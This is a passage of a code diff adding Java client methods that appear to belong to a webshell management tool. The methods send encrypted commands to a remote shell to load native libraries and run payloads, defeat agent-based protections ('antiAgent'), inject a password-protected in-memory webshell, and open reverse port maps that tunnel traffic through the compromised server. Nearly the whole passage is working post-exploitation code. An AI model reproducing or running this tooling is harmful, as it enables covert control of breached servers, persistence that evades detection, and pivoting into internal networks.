+      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
+      byte[] resData = (byte[])((byte[])resultObj.get("data"));
+      String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
+      JSONObject result = new JSONObject(resultTxt);
+      Iterator var9 = result.keySet().iterator();
+
+      while(var9.hasNext()) {
+         String key = (String)var9.next();
+         result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
+      }
+
+      return result;
+   }
+
+   public JSONObject loadLibraryAndexecutePayload(String fileContent, String payload) throws Exception {
+      Map params = new LinkedHashMap();
+      params.put("action", "execute");
+      params.put("whatever", Utils.getWhatever());
+      params.put("fileContent", fileContent);
+      params.put("payload", payload);
+      byte[] data = Utils.getData(this.currentKey, this.encryptType, "loadNativeLibrary", params, this.currentType);
+      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
+      byte[] resData = (byte[])((byte[])resultObj.get("data"));
+      String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
+      JSONObject result = new JSONObject(resultTxt);
+      Iterator var9 = result.keySet().iterator();
+
+      while(var9.hasNext()) {
+         String key = (String)var9.next();
+         result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
+      }
+
+      return result;
+   }
+
+   public JSONObject loadLibraryAndfreeFile(String fileContent, String filePath) throws Exception {
+      Map params = new LinkedHashMap();
+      params.put("action", "freeFile");
+      params.put("whatever", Utils.getWhatever());
+      params.put("fileContent", fileContent);
+      params.put("filePath", filePath);
+      byte[] data = Utils.getData(this.currentKey, this.encryptType, "loadNativeLibrary", params, this.currentType);
+      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
+      byte[] resData = (byte[])((byte[])resultObj.get("data"));
+      String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
+      JSONObject result = new JSONObject(resultTxt);
+      Iterator var9 = result.keySet().iterator();
+
+      while(var9.hasNext()) {
+         String key = (String)var9.next();
+         result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
+      }
+
+      return result;
+   }
+
+   public JSONObject freeFile(String uploadLibPath, String filePath) throws Exception {
+      Map params = new LinkedHashMap();
+      params.put("action", "freeFile");
+      params.put("whatever", Utils.getWhatever());
+      params.put("uploadLibPath", uploadLibPath);
+      params.put("filePath", filePath);
+      byte[] data = Utils.getData(this.currentKey, this.encryptType, "loadNativeLibrary", params, this.currentType);
+      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
+      byte[] resData = (byte[])((byte[])resultObj.get("data"));
+      String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
+      JSONObject result = new JSONObject(resultTxt);
+      Iterator var9 = result.keySet().iterator();
+
+      while(var9.hasNext()) {
+         String key = (String)var9.next();
+         result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
+      }
+
+      return result;
+   }
+
+   public JSONObject loadLibraryAndAntiAgent(String fileContent) throws Exception {
+      Map params = new LinkedHashMap();
+      params.put("action", "antiAgent");
+      params.put("whatever", Utils.getWhatever());
+      params.put("fileContent", fileContent);
+      byte[] data = Utils.getData(this.currentKey, this.encryptType, "loadNativeLibrary", params, this.currentType);
+      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
+      byte[] resData = (byte[])((byte[])resultObj.get("data"));
+      String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
+      JSONObject result = new JSONObject(resultTxt);
+      Iterator var8 = result.keySet().iterator();
+
+      while(var8.hasNext()) {
+         String key = (String)var8.next();
+         result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
+      }
+
+      return result;
+   }
+
+   public JSONObject antiAgent(String uploadLibPath) throws Exception {
+      Map params = new LinkedHashMap();
+      params.put("action", "antiAgent");
+      params.put("whatever", Utils.getWhatever());
+      params.put("uploadLibPath", uploadLibPath);
+      byte[] data = Utils.getData(this.currentKey, this.encryptType, "loadNativeLibrary", params, this.currentType);
+      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
+      byte[] resData = (byte[])((byte[])resultObj.get("data"));
+      String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
+      JSONObject result = new JSONObject(resultTxt);
+      Iterator var8 = result.keySet().iterator();
+
+      while(var8.hasNext()) {
+         String key = (String)var8.next();
+         result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
+      }
+
+      return result;
+   }
+
+   public JSONObject loadLibraryAndtest() throws Exception {
+      Map params = new LinkedHashMap();
+      params.put("action", "test");
+      params.put("whatever", Utils.getWhatever());
+      byte[] data = Utils.getData(this.currentKey, this.encryptType, "loadNativeLibrary", params, this.currentType);
+      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
+      byte[] resData = (byte[])((byte[])resultObj.get("data"));
+      String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
+      JSONObject result = new JSONObject(resultTxt);
+      Iterator var7 = result.keySet().iterator();
+
+      while(var7.hasNext()) {
+         String key = (String)var7.next();
+         result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
+      }
+
+      return result;
+   }
+
+   public JSONObject injectMemShell(String type, String libPath, String path, String password) throws Exception {
+      Map params = new LinkedHashMap();
+      params.put("type", type);
+      params.put("libPath", libPath);
+      params.put("path", path);
+      params.put("password", password);
+      byte[] data = Utils.getData(this.currentKey, this.encryptType, "MemShell", params, this.currentType);
+      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
+      byte[] resData = (byte[])((byte[])resultObj.get("data"));
+      String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
+      JSONObject result = new JSONObject(resultTxt);
+      Iterator var11 = result.keySet().iterator();
+
+      while(var11.hasNext()) {
+         String key = (String)var11.next();
+         result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
+      }
+
+      return result;
+   }
+
+   public JSONObject createReversePortMap(String listenPort) throws Exception {
+      Map params = new LinkedHashMap();
+      params.put("action", "create");
+      params.put("listenPort", listenPort);
+      byte[] data = Utils.getData(this.currentKey, this.encryptType, "ReversePortMap", params, this.currentType);
+      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
+      byte[] resData = (byte[])((byte[])resultObj.get("data"));
+      String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
+
+      try {
+         JSONObject result = new JSONObject(resultTxt);
+         Iterator var8 = result.keySet().iterator();
+
+         while(var8.hasNext()) {
+            String key = (String)var8.next();
+            result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
+         }
+
+         return result;
+      } catch (Exception var10) {
+         throw new Exception(new String(resData));
+      }
+   }
+
+   public byte[] readReversePortMapData(String socketHash) throws Exception {
+      byte[] resData = null;
+      Map params = new LinkedHashMap();
+      params.put("action", "read");
+      params.put("socketHash", socketHash);
+      byte[] data = Utils.getData(this.currentKey, this.encryptType, "ReversePortMap", params, this.currentType);
+      Map result = null;
+
+      try {
+         result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
+      } catch (Exception var8) {
+         byte[] exceptionByte = var8.getMessage().getBytes();
+         if (exceptionByte[0] == 55 && exceptionByte[1] == 33 && exceptionByte[2] == 73 && exceptionByte[3] == 54) {
+            return null;
+         }
+
+         throw var8;
+      }
+
+      Map resHeader = (Map)result.get("header");
+      if (((String)resHeader.get("status")).equals("200")) {
+         resData = (byte[])((byte[])result.get("data"));
+         if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {
+            resData = null;
+         } else {
+            if (resHeader.containsKey("server") && ((String)resHeader.get("server")).indexOf("Apache-Coyote/1.1") > 0) {
+               resData = Arrays.copyOfRange(resData, 0, resData.length - 1);
+            }
+
+            if (resData == null) {
+               resData = new byte[0];
+            }
+         }
+      } else {
+         resData = null;
+      }
+
+      return resData;
+   }
+
+   public boolean writeReversePortMapData(byte[] proxyData, String socketHash) throws Exception {
+      Map params = new LinkedHashMap();
+      params.put("action", "write");
+      params.put("socketHash", socketHash);
+      params.put("extraData", Base64.encode(proxyData));
+      byte[] data = Utils.getData(this.currentKey, this.encryptType, "ReversePortMap", params, this.currentType);
+      Map result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
+      Map resHeader = (Map)result.get("header");
+      byte[] resData = (byte[])((byte[])result.get("data"));
+      if (((String)resHeader.get("status")).equals("200")) {
+         if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {
+            resData = Arrays.copyOfRange(resData, 4, resData.length);
+            return false;
+         } else {
+            return true;
+         }
+      } else {
+         return false;
+      }
+   }
+
+   public JSONObject listReversePortMap() throws Exception {
+      Map params = new LinkedHashMap();
+      params.put("action", "list");
+      byte[] data = Utils.getData(this.currentKey, this.encryptType, "ReversePortMap", params, this.currentType);
+      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
+      byte[] resData = (byte[])((byte[])resultObj.get("data"));
+      String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
+      JSONObject result = new JSONObject(resultTxt);
+      Iterator var7 = result.keySet().iterator();
+
+      while(var7.hasNext()) {
+         String key = (String)var7.next();
+         result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
+      }
+
+      return result;
+   }
+
+   public JSONObject stopReversePortMap(String listenPort) throws Exception {
+      Map params = new LinkedHashMap();
+      params.put("action", "stop");
+      params.put("listenPort", listenPort);
+      byte[] data = Utils.getData(this.currentKey, this.encryptType, "ReversePortMap", params, this.currentType);
+      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
+      byte[] resData = (byte[])((byte[])resultObj.get("data"));
+      String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
+      JSONObject result = new JSONObject(resultTxt);
+      Iterator var8 = result.keySet().iterator();
+
+      while(var8.hasNext()) {
+         String key = (String)var8.next();
+         result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
+      }
+
+      return result;
+   }
+
+   public JSONObject closeReversePortMap(String socketHash) throws Exception {
+      Map params = new LinkedHashMap();
+      params.put("action", "close");
+      params.put("socketHash", socketHash);
+      byte[] data = Utils.getData(this.currentKey, this.encryptType, "ReversePortMap", params, this.currentType);
+      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
+      byte[] resData = (byte[])((byte[])resultObj.get("data"));
+      String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
+      JSONObject result = new JSONObject(resultTxt);
+      Iterator var8 = result.keySet().iterator();
+
+      while(var8.hasNext()) {
+         String key = (String)var8.next();
          result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
       }
 
